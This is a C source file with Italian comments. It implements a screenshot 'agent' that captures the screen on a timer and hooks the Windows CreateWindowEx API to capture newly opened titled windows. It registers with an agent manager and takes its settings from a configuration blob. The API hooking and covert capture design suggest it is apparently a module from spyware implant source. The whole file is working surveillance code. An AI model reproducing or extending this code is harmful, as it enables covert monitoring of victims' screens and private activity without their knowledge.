
#define CAPTURE_INTERVAL 10 // In secondi

typedef struct _snap_param_struct {
	DWORD interval;
	DWORD tag;
	BOOL only_window;
	BOOL on_new_window;
} snap_param_struct;


DWORD capture_interval = CAPTURE_INTERVAL; // In secondi. -1 = non fare mai snapshot col timer
BOOL capture_only_window = FALSE;
BOOL capture_on_new_window = FALSE;

BOOL bPM_SnapShotStarted = FALSE; // Flag che indica se il monitor e' attivo o meno
BOOL bPM_sncp = FALSE; // Semaforo per l'uscita del thread
HANDLE hSnapShotThread = NULL;
HWND g_window_to_capture = NULL;
DWORD g_snap_delay = 0;


// Hook per la notifica di creazione di nuove finestre
typedef struct {
	COMMONDATA;
} CreateWindowExStruct;
CreateWindowExStruct CreateWindowExData;

HWND __stdcall PM_CreateWindowEx(DWORD dwExStyle,
								 LPCTSTR lpClassName,
								 LPCTSTR lpWindowName,
								 DWORD dwStyle,
								 int x,
								 int y,
								 int nWidth,
								 int nHeight,
								 HWND hWndParent,
								 HMENU hMenu,
								 HINSTANCE hInstance,
								 LPVOID lpParam) 
{
	BOOL *Active;

	MARK_HOOK
	INIT_WRAPPER(CreateWindowExStruct)
	CALL_ORIGINAL_API(12)

	Active = (BOOL *)pData->pHM_IpcCliRead(PM_SNAPSHOTAGENT_IPC);
	// Controlla se il monitor e' attivo e se la funzione e' andata a buon fine
	if (!Active || !(*Active) || !ret_code)
		return (HWND)ret_code;

	if ( (dwStyle&WS_CAPTION)==WS_CAPTION || (dwStyle&WS_EX_MDICHILD)==WS_EX_MDICHILD)
		pData->pHM_IpcCliWrite(PM_SNAPSHOTAGENT, (BYTE *)&ret_code, 4, dwStyle, IPC_DEF_PRIORITY);
			
	return (HWND)ret_code;
}

DWORD PM_CreateWindowEx_setup(HMServiceStruct *pData)
{
	CreateWindowExData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
	CreateWindowExData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
	CreateWindowExData.dwHookLen = 256;
	return 0;
}



DWORD WINAPI CaptureScreenThread(DWORD dummy)
{
	LOOP {
		// Se e' appena partito fa subito uno snapshot
		if (g_snap_delay == 0)
			TakeSnapShot(NULL, capture_only_window, PM_SNAPSHOTAGENT, NULL);

		// Ricorda quanto aveva aspettato prima che il thread
		// sia killato
		// g_snap_delay e' in decimi di secondo
		while (g_snap_delay < capture_interval*10) {
			Sleep(200); 
			g_snap_delay += 2;
			CANCELLATION_POINT(bPM_sncp);

			if (g_window_to_capture) {
				Sleep(800);
				g_snap_delay += 8;
				TakeSnapShot(g_window_to_capture, capture_only_window, PM_SNAPSHOTAGENT, NULL);
				g_window_to_capture = NULL;
			}
		}
		g_snap_delay = 0;
	}
}


DWORD __stdcall PM_SnapshotDispatch(BYTE * msg, DWORD dwLen, DWORD dwFlags, FILETIME *dummy)
{
	char buff[64];

	if (!capture_on_new_window)
		return 1;
	HM_SafeGetWindowTextA(*(HWND*)msg, buff, sizeof(buff));
	if (buff[0])  // Solo se ha il titolo
		g_window_to_capture = *(HWND*)msg;

	return 1;
}


DWORD __stdcall PM_SnapShotStartStop(BOOL bStartFlag, BOOL bReset)
{
	DWORD dummy;

	if (bReset)
		// Attiva l'hook solo se l'agente e' attivo e deve fare la cattura on_new_window
		AM_IPCAgentStartStop(PM_SNAPSHOTAGENT_IPC, (bStartFlag && capture_on_new_window));

	// Se l'agent e' gia' nella condizione desiderata
	// non fa nulla.
	if (bPM_SnapShotStarted == bStartFlag)
		return 0;

	bPM_SnapShotStarted = bStartFlag;

	if (bStartFlag) {
		// Se e' stato startato esplicitamente, ricomincia dal primo snapshot
		if (bReset)
			g_snap_delay = 0;

		// Crea il thread che esegue gli snapshot
		hSnapShotThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CaptureScreenThread, NULL, 0, &dummy);
	} else {
		// All'inizio non si stoppa perche' l'agent e' gia' nella condizione
		// stoppata (bPM_SnapShotStarted = bStartFlag = FALSE)
		QUERY_CANCELLATION(hSnapShotThread, bPM_sncp);
	}

	return 1;
}


DWORD __stdcall PM_SnapShotInit(BYTE *conf_ptr, BOOL bStartFlag)
{
	snap_param_struct *snap_param = (snap_param_struct *)conf_ptr;

	// Setta il capture interval dello snapshot
	if (snap_param) {
		capture_interval = snap_param->interval;
		// Se sta leggendo un file che contiene queste informazioni
		if (snap_param->tag == 0xDEADBEEF) {
			capture_only_window = snap_param->only_window;
			capture_on_new_window = snap_param->on_new_window;
		} else {
			// Se sta leggendo un vecchio file di conf
			capture_only_window = FALSE;
			capture_on_new_window = FALSE;
		}
	} else { // di default e' settato a CAPTURE_INTERVAL
		capture_interval = CAPTURE_INTERVAL;
		capture_only_window = FALSE;
		capture_on_new_window = FALSE;
	}

	PM_SnapShotStartStop(bStartFlag, TRUE);
	return 1;
}


void PM_SnapShotRegister()
{
	// Non ha nessuna funzione di Dispatch
	AM_MonitorRegister(PM_SNAPSHOTAGENT, (BYTE *)PM_SnapshotDispatch, (BYTE *)PM_SnapShotStartStop, (BYTE *)PM_SnapShotInit, NULL);

	// Inizialmente i monitor devono avere una configurazione di default nel caso
	// non siano referenziati nel file di configurazione (partono comunque come stoppati).
	PM_SnapShotInit(NULL, FALSE);
}